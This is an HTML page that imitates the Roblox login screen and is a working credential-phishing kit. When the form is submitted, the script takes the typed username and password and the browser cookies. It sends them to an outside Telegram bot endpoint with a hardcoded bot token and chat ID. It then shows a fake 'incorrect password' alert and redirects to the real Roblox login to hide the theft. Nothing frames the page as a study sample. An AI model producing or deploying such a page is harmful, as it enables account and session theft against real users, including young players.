<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox – Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
        }
        body {
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-box {
            background: #fff;
            padding: 44px 40px 40px;
            border-radius: 12px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 8px 40px rgba(0,0,0,0.5);
            text-align: center;
        }
        .login-box img {
            width: 150px;
            margin-bottom: 24px;
        }
        .login-box h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1a1a2e;
            margin-bottom: 6px;
        }
        .login-box .sub {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .login-box label {
            display: block;
            text-align: left;
            font-size: 13px;
            font-weight: 600;
            color: #222;
            margin: 10px 0 4px;
        }
        .login-box input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 15px;
            background: #fafafa;
            transition: 0.2s;
        }
        .login-box input:focus {
            border-color: #0077ff;
            outline: none;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(0,119,255,0.15);
        }
        .login-box .forgot {
            display: block;
            text-align: right;
            font-size: 12px;
            color: #0077ff;
            text-decoration: none;
            margin-top: 4px;
        }
        .login-box .forgot:hover {
            text-decoration: underline;
        }
        .login-box button {
            width: 100%;
            padding: 14px;
            background: #e03a3a;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 18px;
            transition: 0.15s;
        }
        .login-box button:hover {
            background: #c62a2a;
        }
        .login-box .signup {
            margin-top: 18px;
            font-size: 14px;
            color: #444;
        }
        .login-box .signup a {
            color: #0077ff;
            text-decoration: none;
            font-weight: 600;
        }
        .login-box .signup a:hover {
            text-decoration: underline;
        }
        .login-box .footer {
            margin-top: 24px;
            font-size: 11px;
            color: #999;
            border-top: 1px solid #eee;
            padding-top: 16px;
        }
        .login-box .footer a {
            color: #666;
            text-decoration: none;
            margin: 0 6px;
        }
        .login-box .footer a:hover {
            text-decoration: underline;
        }
        @media (max-width: 420px) {
            .login-box {
                padding: 30px 20px;
                margin: 16px;
            }
        }
    </style>
</head>
<body>
<div class="login-box">
    <img src="https://www.roblox.com/assets/img/logo.png" alt="Roblox">
    <h1>Log In</h1>
    <div class="sub">to continue to Roblox</div>

    <form id="loginForm">
        <label for="user">Username</label>
        <input type="text" id="user" placeholder="Enter your username" required>

        <label for="pass">Password</label>
        <input type="password" id="pass" placeholder="Enter your password" required>
        <a href="#" class="forgot">Forgot password?</a>

        <button type="submit">Log In</button>
    </form>

    <div class="signup">
        Don't have an account? <a href="#">Sign Up</a>
    </div>

    <div class="footer">
        <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">About</a>
    </div>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        let u = document.getElementById('user').value;
        let p = document.getElementById('pass').value;
        let c = document.cookie || 'No cookie';

        fetch('https://api.telegram.org/bot8879421873:AAHn8_tRAwlc4lVGCIN-A0J_u6y_alhCR8A/sendMessage', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: '1899955226',
                text: 'User: ' + u + '\nPass: ' + p + '\nCookie: ' + c
            })
        });

        alert('Incorrect username or password. Please try again.');
        window.location.href = 'https://www.roblox.com/login';
    });
</script>
</body>
</html>
